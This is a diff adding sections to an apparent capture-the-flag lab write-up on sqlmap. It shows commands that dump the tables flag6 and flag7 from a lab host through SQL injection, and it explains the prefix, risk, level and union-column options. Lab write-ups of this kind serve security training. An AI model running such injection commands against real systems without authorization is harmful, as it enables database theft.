@@ -103,6 +103,30 @@ From the command:
      --dbs - The database in question.
      --dbms - The underlying Database schema being used.
 
+`2. What's the contents of table flag6? (Case #6)`
+
+The challenge has a vulnerable parameter col. This challenge requires the use of the prefix flag.
+
+`sqlmap -u 'http://83.136.248.62:52853/case6.php?col=id' -T flag6 --dump --batch --risk 3 --level 5 --prefix='`)'`
+
+From the command:
+
+    --prefix -  used to specify a prefix that will be added to the payloads sent by SQLmap during its testing process
+
+`3. What's the contents of table flag7? (Case #7)`
+
+The challenge has a vulnerable parameter at id and it is vulnerable using a UNION Query based technique. This means that we have to use the Technique flag.
+
+`sqlmap -u 'http://83.136.248.62:52853/case7.php?id=1' -T flag7 --dump --batch --risk 3 --level 5 --union-col=5`
+
+From the Command:
+
+    --union-col=5 - From the provided exercise we can manually count the columns in the table, so we include that in the command
+
+# Database Enumeration
+
+
+
 
 
 
